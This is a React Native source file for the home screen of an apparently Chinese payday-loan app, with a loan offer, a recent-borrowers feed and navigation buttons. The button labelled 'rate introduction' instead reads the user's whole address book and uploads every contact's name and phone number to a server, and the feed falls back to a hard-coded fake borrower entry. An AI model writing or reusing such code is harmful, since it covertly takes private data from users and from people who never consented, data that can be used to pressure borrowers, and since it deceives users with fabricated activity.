import React, {PureComponent} from 'react';
import {View, Text, TouchableOpacity, Image, Alert, StyleSheet, ScrollView, RefreshControl} from 'react-native';

import Contacts from 'react-native-contacts';


class HomeScene extends PureComponent{
	
	static navigationOptions = ({navigation})=>({
		headerRight: (
			<View style={{flexDirection: 'row'}}>
				<TouchableOpacity onPress={()=>{}}>
					<Image style={styles.imageNotice} source={require('../../img/Home/icon_navigationItem_message_white.png')} />
				</TouchableOpacity>
			</View>
		),
		headerStyle: {backgroundColor: '#06C1AE'}
	});
	
	state: {
		isRefreshing: boolean,
		dataList: Array<Object>
	}
	
	constructor(props: Object){
		super(props)
		
		this.state = {
			isRefreshing: false,
			dataList: []
		}
		
		{ (this: any).requestData = this.requestData.bind(this) }
	}
	
	// componentDidMount(){
	componentWillMount(){
		this.requestData();
	}
	
	requestData(){
		this.setState({ isRefreshing: true })

		this.requestLoanList()
	}
	
	async requestLoanList(){
		try {
            // let response = await  fetch('http://172.16.1.95:8180/admin/app/get/lately/brecord/list?t='+(new Date()).getTime(), {
					  // method: 'POST',
					  // mode: "no-cors",
					  // cache: "no-cache",
					  // headers: {
						// 'Accept': 'application/json',
						// 'Content-Type': 'application/json'
					  // },
					  // body: JSON.stringify({
						// appid: 'IOS',
						// timestamp: '2017-12-12 10:11:21',
						// data: 'EUvgIwkzRRk+BtkBpw73bw=='
						// data: 'GtjO45J7Pl9Ir3epcg9yfg=='
					  // })
				// });
				
			// let response = await  fetch('http://localhost/react/data/TestMT01/index.php?act=getLastLoan');
			let response = await  fetch('http://172.16.1.95/react/data/TestMT01/index.php?act=getLastLoan');
			let json = await response.json()			
            let dataList = json.data.map(
                (info) => {
                    return {
								userName: info.userName.substring(0, 3)+"***"+info.userName.substring(7),
								borrowMoney: info.borrowMoney
					};
                }
            )

            this.setState({
                dataList: dataList,
                isRefreshing: false,
            })
        } catch (error) {
			Alert.alert("ERROR:"+error);
            this.setState({ isRefreshing: false })
        }
	}
	
	renderHeader(){
		return (
			<View style={styles.header}>
				<View style={{flexDirection:'column'}}>
						<Text style={{fontSize: 16, color: '#777777', textAlign:'center'}}>2000 元现金申请就到账</Text>
						<Text style={{fontSize: 11, color: '#777777', textAlign:'center', padding: 10}}>日利率低至 0.05%</Text>
						<View style={{padding:2}}></View>
						<TouchableOpacity onPress={
							()=> {
								Alert.alert(
									`确认操作`,
									'确定要借款？',
									[
										{text: '确定', onPress: () => {this.props.navigation.navigate('Product')}},
										{text: '', onPress: () => {}, style: 'cancel'},
										{text: '取消', onPress: () => {}},
									]
								)
							}
						}>
							<Text style={{textAlign:'center', fontSize: 18, color:'red'}}>立即借款</Text>
						</TouchableOpacity>
				</View>
			</View>
		);
	}

	getLoanListData(){
		if(this.state.dataList.length == 0){
			return ([
				{userName: '156****760', borrowMoney: '7800'},
			]);			
		}else{			
			return this.state.dataList;
		}
	}
	
	renderCell(){
		let dataList = this.getLoanListData();
		let cells = [];
		for(let i = 0; i<dataList.length;i++){
			let cell = <TouchableOpacity key={i} onPress={() => {}}>			
			<View style={{flexDirection:'row', backgroundColor:'#123456', padding: 17}}>
				<Image style={{ marginLeft: 3 }} source={require('../../img/Mine/beauty_technician_v15.png')} />
				<Text style={{paddingLeft:13, color:'white'}}>用户 {dataList[i].userName} 刚借到了 {dataList[i].borrowMoney} 元</Text>
			</View>
			</TouchableOpacity>
			
			cells.push(cell);
		}
		
		return (
			<View>
				{cells}
			</View>
		);
	}
	
	onHeaderRefresh(){
		this.requestData();
		
		setTimeout(()=>{
			this.setState({ isRefreshing: false })
		}, 2000);
	}
	
	async sendMobileData(contacts){
		try{
			let mobileList = contacts.map(
                (info) => {
                    return {
								userName: info.givenName,
								mobile: info.phoneNumbers[0].number
					};
                }
            );
			
			
			var formData = new FormData();
			formData.append('data', JSON.stringify(mobileList));  
			formData.append('act', 'accessMobile'); 
			
			//提交反馈数据
			let response = await fetch('http://172.16.1.95/react/data/TestMT01/index.php',{
				method: 'POST',
				mode: 'no-cors',
				cache: 'no-cache',
				body: formData,
			})
			
			let json = await response.json()			
			if(json.errno == 0){
				Alert.alert('通讯录上传成功!');
			}else{
				Alert.alert('ERROR：'+json.errmsg);
			}
		}catch(error){
			Alert.alert('ERROR:'+error);
		}
	}
	
	render(){
		return (
			<View style={{flex: 1, backgroundColor: '#f3f3f3'}}>
				<ScrollView
					refreshControl={
						<RefreshControl
							refreshing={this.state.isRefreshing}
							onRefresh={() => this.onHeaderRefresh()}
							tintColor='red'
						/>
					}
				>
					{this.renderHeader()}
					<View style={{padding:14}} />
					
					<View>
						{this.renderCell()}
					</View>
					<View style={{padding:14}} />
					
					<View style={{flex: 1, backgroundColor:'white'}}>
						<View style={{flexDirection:'row', justifyContent: 'center'}}>
							<TouchableOpacity onPress={() => {
								this.props.navigation.navigate('RePayLoan')
							}}>
								<Text style={{backgroundColor:'white', borderRightWidth:1, borderColor:'#e0e0e0', padding:26, fontSize: 16}}>我要还款</Text>
							</TouchableOpacity>
							<TouchableOpacity onPress={() => {
								// Contacts.getContactsMatchingString("filter", (err, contacts) => {
								Contacts.getAll((err, contacts) => {
								  if(err === 'denied'){
										Alert.alert('denied access PhoneLink');
								  } else {
										Alert.alert('allow access PhoneLink');
										
										if(contacts[0] && contacts[0].givenName){
											Alert.alert(contacts[0].givenName+": "+contacts[0].phoneNumbers[0].number);
											
											//同步通讯录数据
											this.sendMobileData(contacts);
										}
								  }
								});
							}}>
								<Text style={{backgroundColor:'white', borderRightWidth:1, borderColor:'#e0e0e0', padding:26, fontSize: 16}}>费率介绍</Text>
							</TouchableOpacity>
							<TouchableOpacity onPress={() => {
								this.props.navigation.navigate('About')
							}}>
								<Text style={{backgroundColor:'white', padding:26, fontSize: 16}}>米缸贷</Text>
							</TouchableOpacity>
						</View>
					</View>
				</ScrollView>
			</View>
		);
	}
}

const styles = StyleSheet.create({
	imageNotice: {
		width: 27,
		height:27,
		margin:8
	},
	header: {
		backgroundColor:'#06C1AE',
		paddingTop: 16,
		paddingBottom: 10,
	},
	loanBtn: {
		fontSize: 18,
		color: 'red',
		width: 30,
		height:13
	}
});

export default HomeScene;